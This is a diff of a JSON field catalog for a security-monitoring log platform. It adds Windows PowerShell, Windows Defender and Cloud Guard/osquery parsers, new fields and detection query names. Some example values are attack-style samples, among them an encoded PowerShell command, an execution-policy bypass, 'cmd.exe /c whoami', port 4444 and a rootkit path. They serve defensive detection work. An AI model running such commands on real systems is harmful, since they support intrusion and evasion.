@@ -1,12 +1,12 @@
 {
   "version": "1.0",
-  "generated_at": "2026-05-17T07:19:01.084250+00:00",
+  "generated_at": "2026-06-04T18:59:00.540200+00:00",
   "summary": {
-    "total_fields": 256,
-    "parser_count": 15,
-    "source_count": 15,
+    "total_fields": 277,
+    "parser_count": 18,
+    "source_count": 18,
     "reserved_mapping_violations": 0,
-    "fields_with_query_usage": 111
+    "fields_with_query_usage": 126
   },
   "approved_builtins": [
     "Channel",
@@ -40,6 +40,15 @@
       "OCI Cloud Guard Problems",
       "OCI Cloud Guard Logs"
     ],
+    "cloud_guard_instance_security": [
+      "SOC Cloud Guard Instance Security Logs",
+      "OCI Cloud Guard Instance Security Logs",
+      "SOC OSQuery Result Logs"
+    ],
+    "osquery_results": [
+      "SOC OSQuery Result Logs",
+      "SOC Cloud Guard Instance Security Logs"
+    ],
     "linux_syslog": [
       "SOC Linux Syslog Logs",
       "Linux Secure Logs",
@@ -57,6 +66,12 @@
     ],
     "windows_event_system": [
       "Windows Event System Logs"
+    ],
+    "windows_powershell_operational": [
+      "Windows PowerShell Operational Logs"
+    ],
+    "windows_defender_operational": [
+      "Windows Defender Operational Logs"
     ],
     "linux_secure": [
       "SOC Linux Syslog Logs",
@@ -84,6 +99,10 @@
       "SOC Web Application Logs"
     ],
     "application_logs": [
+      "SOC Application Logs"
+    ],
+    "azure_log_analytics_custom": [
+      "Azure Log Analytics Custom Logs",
       "SOC Application Logs"
     ],
     "vcn_flow": [
@@ -123,18 +142,39 @@
       "field_count": 14
     },
     {
+      "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+      "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+      "source_internal": "socCloudGuardInstanceSecuritySource",
+      "source_display": "SOC Cloud Guard Instance Security Logs",
+      "field_count": 31
+    },
+    {
       "parser_name": "socWinEventSecurityJsonParser",
       "parser_display": "SOC Windows Event Security JSON Parser",
       "source_internal": "socWinEventSecuritySource",
       "source_display": "Windows Event Security Logs",
-      "field_count": 23
+      "field_count": 32
     },
     {
       "parser_name": "socWinEventSystemJsonParser",
       "parser_display": "SOC Windows Event System JSON Parser",
       "source_internal": "socWinEventSystemSource",
       "source_display": "Windows Event System Logs",
-      "field_count": 7
+      "field_count": 8
+    },
+    {
+      "parser_name": "socWinPowerShellOperationalJsonParser",
+      "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+      "source_internal": "socWinPowerShellOperationalSource",
+      "source_display": "Windows PowerShell Operational Logs",
+      "field_count": 12
+    },
+    {
+      "parser_name": "socWindowsDefenderOperationalJsonParser",
+      "parser_display": "SOC Windows Defender Operational JSON Parser",
+      "source_internal": "socWindowsDefenderOperationalSource",
+      "source_display": "Windows Defender Operational Logs",
+      "field_count": 15
     },
     {
       "parser_name": "socLinuxSecureJsonParser",
@@ -235,6 +275,15 @@
       ]
     },
     {
+      "source_internal": "socCloudGuardInstanceSecuritySource",
+      "source_display": "SOC Cloud Guard Instance Security Logs",
+      "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+      "candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ]
+    },
+    {
       "source_internal": "socWinEventSecuritySource",
       "source_display": "Windows Event Security Logs",
       "parser_name": "socWinEventSecurityJsonParser",
@@ -248,6 +297,22 @@
       "parser_name": "socWinEventSystemJsonParser",
       "candidate_groups": [
         "windows_event_system"
+      ]
+    },
+    {
+      "source_internal": "socWinPowerShellOperationalSource",
+      "source_display": "Windows PowerShell Operational Logs",
+      "parser_name": "socWinPowerShellOperationalJsonParser",
+      "candidate_groups": [
+        "windows_powershell_operational"
+      ]
+    },
+    {
+      "source_internal": "socWindowsDefenderOperationalSource",
+      "source_display": "Windows Defender Operational Logs",
+      "parser_name": "socWindowsDefenderOperationalJsonParser",
+      "candidate_groups": [
+        "windows_defender_operational"
       ]
     },
     {
@@ -306,7 +371,8 @@
       "source_display": "SOC Application Logs",
       "parser_name": "socApplicationJsonParser",
       "candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ]
     },
     {
@@ -335,6 +401,38 @@
     }
   ],
   "fields": [
+    {
+      "display_name": "Access Mask",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.AccessMask"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 25,
+          "raw_json_path": "$.AccessMask"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "0x12019f"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
     {
       "display_name": "Account Name",
       "kind": "custom",
@@ -374,11 +472,18 @@
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
+        "$.Action",
         "$.action",
         "$.data.action",
         "$.logContent.data.action"
       ],
       "parsers": [
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 11,
+          "raw_json_path": "$.Action"
+        },
         {
           "parser_name": "socWafSecurityJsonParser",
           "parser_display": "SOC WAF Security JSON Parser",
@@ -400,6 +505,10 @@
       ],
       "sources": [
         {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socWafSecuritySource",
           "source_display": "SOC WAF Security Logs"
         },
@@ -415,9 +524,11 @@
       "source_candidate_groups": [
         "network_firewall",
         "vcn_flow",
-        "waf_security"
+        "waf_security",
+        "windows_defender_operational"
       ],
       "example_values": [
+        "Detected",
         "BLOCK",
         "ACCEPT",
         "alert"
@@ -425,7 +536,8 @@
       "contract_datasets": [
         "network_firewall.jsonl",
         "vcn_flow.jsonl",
-        "waf_security.jsonl"
+        "waf_security.jsonl",
+        "windows_defender_operational.jsonl"
       ],
       "queries_using_it": [
         "hunting/waf_attack_frequency_by_source.json",
@@ -448,7 +560,8 @@
         "waf_sql_injection_attack_allowed_through.json",
         "waf_sql_injection_attack_blocked.json",
         "waf_web_shell_upload_attempt_blocked.json",
-        "waf_xml_external_entity_attack_blocked.json"
+        "waf_xml_external_entity_attack_blocked.json",
+        "windows_defender_malware_or_remediation_event.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -475,7 +588,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "allow"
@@ -509,7 +623,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "<OCI_RESOURCE_OCID>"
@@ -541,7 +656,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         34
@@ -573,7 +689,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "octo-public-api-gateway"
@@ -605,7 +722,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "suspicious_burst_observed"
@@ -639,7 +757,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         120
@@ -671,7 +790,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         87
@@ -703,7 +823,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "gw-req-demo-001"
@@ -737,7 +858,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "/api/shop/attack/simulate"
@@ -771,7 +893,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "shop_attack"
@@ -803,7 +926,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "public-attack-simulate"
@@ -835,7 +959,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "public"
@@ -867,7 +992,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "attack_lab_probe"
@@ -903,7 +1029,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "octo-apm-demo"
@@ -947,7 +1074,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "OCTO CRM APM"
@@ -979,7 +1107,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "enterprise-crm-portal"
@@ -1013,7 +1142,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "python"
@@ -1047,7 +1177,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "enterprise-crm-portal"
@@ -1098,6 +1229,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "webapp_security"
       ],
       "example_values": [
@@ -1134,7 +1266,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "/shop/checkout/payment/redirect"
@@ -1166,7 +1299,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "attack-octo-demo-001"
@@ -1186,7 +1320,12 @@
         "apps/apm_octo_rule_payment_redirect_count.json",
         "apps/apm_octo_span_link.json",
         "apps/apm_octo_trace_investigation_tiles.json",
-        "apps/apm_octo_trace_logs_correlation.json"
+        "apps/apm_octo_trace_logs_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_kubernetes_attack_path_link.json",
+        "apps/oke_rule_boopkit_ebpf_rootkit_count.json",
+        "apps/oke_rule_privileged_workload_count.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -1225,6 +1364,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "webapp_security"
       ],
       "example_values": [
@@ -1258,7 +1398,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "payment_redirect"
@@ -1269,7 +1410,14 @@
         "apps/apm_octo_attack_timeline.json",
         "apps/apm_octo_attack_trace_correlation.json",
         "apps/apm_octo_trace_investigation_tiles.json",
-        "apps/apm_octo_trace_logs_correlation.json"
+        "apps/apm_octo_trace_logs_correlation.json",
+        "apps/oke_boopkit_attack_timeline.json",
+        "apps/oke_ebpf_rootkit_activity.json",
+        "apps/oke_exec_and_node_escape.json",
+        "apps/oke_kubernetes_attack_overview.json",
+        "apps/oke_privileged_workload_creation.json",
+        "apps/oke_rule_privileged_workload_count.json",
+        "apps/oke_secrets_and_rbac_abuse.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -1315,6 +1463,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "webapp_security"
       ],
       "example_values": [
@@ -1413,7 +1562,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -1514,7 +1664,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -1544,7 +1695,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "order-42"
@@ -1691,22 +1843,49 @@
           "parser_display": "SOC Windows Sysmon JSON Parser",
           "sequence": 24,
           "raw_json_path": "$.Channel"
+        },
+        {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 8,
+          "raw_json_path": "$.Channel"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 8,
+          "raw_json_path": "$.Channel"
         }
       ],
       "sources": [
         {
           "source_internal": "socWindowsSysmonSource",
           "source_display": "SOC Windows Sysmon Logs"
+        },
+        {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
         }
       ],
       "source_candidate_groups": [
         "sysmon_operational",
+        "windows_defender_operational",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
-        "Microsoft-Windows-Sysmon/Operational"
+        "Microsoft-Windows-Sysmon/Operational",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-Windows Defender/Operational"
       ],
-      "contract_datasets": [],
+      "contract_datasets": [
+        "windows_defender_operational.jsonl",
+        "windows_powershell_operational.jsonl"
+      ],
       "queries_using_it": [],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -1733,7 +1912,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "false"
@@ -1765,7 +1945,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -1797,7 +1978,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -1829,7 +2011,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         0
@@ -1906,6 +2089,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -2020,6 +2204,12 @@
           "raw_json_path": "$.CommandLine"
         },
         {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 10,
+          "raw_json_path": "$.CommandLine"
+        },
+        {
           "parser_name": "socLinuxSecureJsonParser",
           "parser_display": "SOC Linux Secure JSON Parser",
           "sequence": 15,
@@ -2046,6 +2236,10 @@
           "source_display": "Windows Event Security Logs"
         },
         {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
           "source_internal": "socLinuxSecureSource",
           "source_display": "Linux Secure Logs"
         },
@@ -2060,11 +2254,13 @@
         "sysmon_network",
         "sysmon_operational",
         "windows_event_security",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         "powershell.exe -enc SQBFAFgA",
         "",
+        "powershell.exe -NoProfile -ExecutionPolicy Bypass",
         "cmd.exe /c whoami"
       ],
       "contract_datasets": [
@@ -2093,6 +2289,7 @@
         "bluelight_yara_system_recon.json",
         "boot_configuration_change_for_persistence.json",
         "browser_credential_store_access.json",
+        "clickfix_fake_captcha_powershell_execution.json",
         "clipboard_data_collection.json",
         "cmd_suspicious_child_process.json",
         "cmstp_uac_bypass.json",
@@ -2270,6 +2467,7 @@
         "windows_remote_access_tool_detected.json",
         "windows_remote_management_shell_via_winrs.json",
         "windows_remote_system_discovery.json",
+        "windows_scheduled_task_created_or_updated_event.json",
         "windows_scheduled_task_creation_via_schtasks.json",
         "windows_screen_capture_activity.json",
         "windows_script_host_execution_from_temp.json",
@@ -2345,7 +2543,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         true
@@ -2412,6 +2611,7 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
         "lb_access",
         "waf_security",
         "webapp_security"
@@ -2451,7 +2651,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "trace_demo_cross_service_001"
@@ -2614,7 +2815,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "octo_atp_tp"
@@ -2648,7 +2850,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         155
@@ -2683,7 +2886,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "<OCI_RESOURCE_OCID>"
@@ -2715,7 +2919,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "select * from orders where id = :id"
@@ -2754,7 +2959,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "oracle_atp"
@@ -2796,7 +3002,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         "production"
@@ -2934,6 +3141,12 @@
           "raw_json_path": "$.DestinationIp"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 26,
+          "raw_json_path": "$.destination.ip"
+        },
+        {
           "parser_name": "socSysmonOperationalJsonParser",
           "parser_display": "SOC Sysmon Operational JSON Parser",
           "sequence": 11,
@@ -2970,6 +3183,10 @@
           "source_display": "SOC Windows Sysmon Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socSysmonOperationalSource",
           "source_display": "Windows Sysmon Operational Logs"
         },
@@ -2992,7 +3209,10 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
         "network_firewall",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "vcn_flow",
@@ -3006,6 +3226,7 @@
         "vcn_flow.jsonl"
       ],
       "queries_using_it": [
+        "cloud_guard_instance_security_high_severity_pivots.json",
         "hunting/c2_affected_hosts_kpi.json",
         "hunting/c2_beacon_activity_timeline.json",
         "hunting/c2_communication_topology.json",
@@ -3057,6 +3278,12 @@
           "raw_json_path": "$.DestinationPort"
         },
         {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 27,
+          "raw_json_path": "$.destination.port"
+        },
+        {
           "parser_name": "socSysmonOperationalJsonParser",
           "parser_display": "SOC Sysmon Operational JSON Parser",
           "sequence": 12,
@@ -3093,6 +3320,10 @@
           "source_display": "SOC Windows Sysmon Logs"
         },
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
           "source_internal": "socSysmonOperationalSource",
           "source_display": "Windows Sysmon Operational Logs"
         },
@@ -3115,13 +3346,17 @@
       ],
       "source_candidate_groups": [
         "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
         "network_firewall",
+        "osquery_results",
         "sysmon_network",
         "sysmon_operational",
         "vcn_flow",
         "windows_sysmon"
       ],
       "example_values": [
+        4444,
         443
       ],
       "contract_datasets": [
@@ -3149,6 +3384,38 @@
         "sysmon_mimikatz_network_activity.json",
         "sysmon_rdp_lateral_movement.json"
       ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Detection Source",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.DetectionSource"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 14,
+          "raw_json_path": "$.DetectionSource"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_defender_operational"
+      ],
+      "example_values": [
+        "Real-Time Protection"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
     },
@@ -3321,7 +3588,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3358,7 +3626,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3438,7 +3707,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [
         ""
@@ -3481,7 +3751,10 @@
       "example_values": [
         "Microsoft-Windows-Sysmon/Operational"
       ],
-      "contract_datasets": [],
+      "contract_datasets": [
+        "windows_defender_operational.jsonl",
+        "windows_powershell_operational.jsonl"
+      ],
       "queries_using_it": [],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -3513,6 +3786,18 @@
           "raw_json_path": "$.EventID"
         },
         {
+          "parser_name": "socWinPowerShellOperationalJsonParser",
+          "parser_display": "SOC Windows PowerShell Operational JSON Parser",
+          "sequence": 3,
+          "raw_json_path": "$.EventID"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 3,
+          "raw_json_path": "$.EventID"
+        },
+        {
           "parser_name": "socSysmonOperationalJsonParser",
           "parser_display": "SOC Sysmon Operational JSON Parser",
           "sequence": 3,
@@ -3539,6 +3824,14 @@
           "source_display": "Windows Event System Logs"
         },
         {
+          "source_internal": "socWinPowerShellOperationalSource",
+          "source_display": "Windows PowerShell Operational Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socSysmonOperationalSource",
           "source_display": "Windows Sysmon Operational Logs"
         },
@@ -3550,21 +3843,27 @@
       "source_candidate_groups": [
         "sysmon_network",
         "sysmon_operational",
+        "windows_defender_operational",
         "windows_event_security",
         "windows_event_system",
+        "windows_powershell_operational",
         "windows_sysmon"
       ],
       "example_values": [
         1,
         "4769",
         "7045",
+        "4104",
+        "1116",
         3
       ],
       "contract_datasets": [
         "sysmon_network.jsonl",
         "sysmon_operational.jsonl",
+        "windows_defender_operational.jsonl",
         "windows_event_security.jsonl",
         "windows_event_system.jsonl",
+        "windows_powershell_operational.jsonl",
         "windows_sysmon.jsonl"
       ],
       "queries_using_it": [
@@ -3580,6 +3879,7 @@
         "bluelight_screen_capture.json",
         "bluelight_system_discovery.json",
         "brute_force_failed_logon_spike.json",
+        "clickfix_fake_captcha_powershell_execution.json",
         "cmd_suspicious_child_process.json",
         "credential_manager_access.json",
         "dcsync_directory_replication.json",
@@ -3619,7 +3919,19 @@
         "sentinel/discord_download_invoked_from_cmd_line.json",
         "sentinel/mcafee_epo_-_deployment_failed.json",
         "sentinel/nrt_base64_encoded_windows_process_command-lines.json",
-        "sentinel/vulerabilities.json"
+        "sentinel/vulerabilities.json",
+        "sysmon_executable_file_created_or_detected.json",
+        "windows_account_or_group_enumeration_spike.json",
+        "windows_admin_share_access_spike_event.json",
+        "windows_audit_policy_changed.json",
+        "windows_defender_malware_or_remediation_event.json",
+        "windows_kerberos_pre_authentication_failures.json",
+        "windows_ntlm_authentication_failures.json",
+        "windows_powershell_script_block_suspicious_content.json",
+        "windows_privileged_group_membership_change_event.json",
+        "windows_scheduled_task_created_or_updated_event.json",
+        "windows_security_log_cleared_event.json",
+        "windows_service_installed_event_log.json"
       ],
       "dashboards_using_it": [],
       "reserved_backing_field": ""
@@ -3653,7 +3965,8 @@
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom"
       ],
       "example_values": [],
       "contract_datasets": [],
@@ -3707,13 +4020,61 @@
       "reserved_backing_field": ""
     },
     {
+      "display_name": "Failure Reason",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.FailureReason"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socWinEventSecurityJsonParser",
+          "parser_display": "SOC Windows Event Security JSON Parser",
+          "sequence": 26,
+          "raw_json_path": "$.FailureReason"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socWinEventSecuritySource",
+          "source_display": "Windows Event Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "windows_event_security"
+      ],
+      "example_values": [
+        "0xC000006D"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "windows_kerberos_pre_authentication_failures.json",
+        "windows_ntlm_authentication_failures.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
       "display_name": "File Path",
       "kind": "custom",
       "type": "STRING",
       "raw_json_paths": [
-        "$.file.path"
+        "$.file.path",
+        "$.FilePath"
       ],
       "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 24,
+          "raw_json_path": "$.file.path"
+        },
+        {
+          "parser_name": "socWindowsDefenderOperationalJsonParser",
+          "parser_display": "SOC Windows Defender Operational JSON Parser",
+          "sequence": 15,
+          "raw_json_path": "$.FilePath"
+        },
         {
           "parser_name": "socApplicationJsonParser",
           "parser_display": "SOC Application JSON Parser",
@@ -3723,18 +4084,183 @@
       ],
       "sources": [
         {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        },
+        {
+          "source_internal": "socWindowsDefenderOperationalSource",
+          "source_display": "Windows Defender Operational Logs"
+        },
+        {
           "source_internal": "socApplicationSource",
           "source_display": "SOC Application Logs"
         }
       ],
       "source_candidate_groups": [
-        "application_logs"
+        "application_logs",
+        "azure_log_analytics_custom",
+        "cloud_guard_instance_security",
+        "osquery_results",
+        "windows_defender_operational"
       ],
       "example_values": [
+        "/tmp/boopkit",
+        "C:\\Users\\Public\\stage.exe",
         "/etc/nginx/conf.d/payment_redirect.conf"
       ],
       "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_high_severity_pivots.json",
+        "cloud_guard_instance_security_raw_result_detail.json",
+        "windows_defender_malware_or_remediation_event.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Finding ID",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.findingId"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 11,
+          "raw_json_path": "$.findingId"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "finding-osquery-listener-001"
+      ],
+      "contract_datasets": [],
       "queries_using_it": [],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Finding Name",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.findingName"
+      ],
+      "parsers": [
+        {
+          "parser_name": "socCloudGuardInstanceSecurityJsonParser",
+          "parser_display": "SOC Cloud Guard Instance Security JSON Parser",
+          "sequence": 12,
+          "raw_json_path": "$.findingName"
+        }
+      ],
+      "sources": [
+        {
+          "source_internal": "socCloudGuardInstanceSecuritySource",
+          "source_display": "SOC Cloud Guard Instance Security Logs"
+        }
+      ],
+      "source_candidate_groups": [
+        "cloud_guard_instance_security",
+        "osquery_results"
+      ],
+      "example_values": [
+        "Unexpected Listener"
+      ],
+      "contract_datasets": [],
+      "queries_using_it": [
+        "cloud_guard_instance_security_findings_by_host.json",
+        "cloud_guard_instance_security_high_severity_pivots.json",
+        "cloud_guard_instance_security_raw_result_detail.json"
+      ],
+      "dashboards_using_it": [],
+      "reserved_backing_field": ""
+    },
+    {
+      "display_name": "Finding Severity",
+      "kind": "custom",
+      "type": "STRING",
+      "raw_json_paths": [
+        "$.severity"
+      ],
+      "parsers": [
+        {
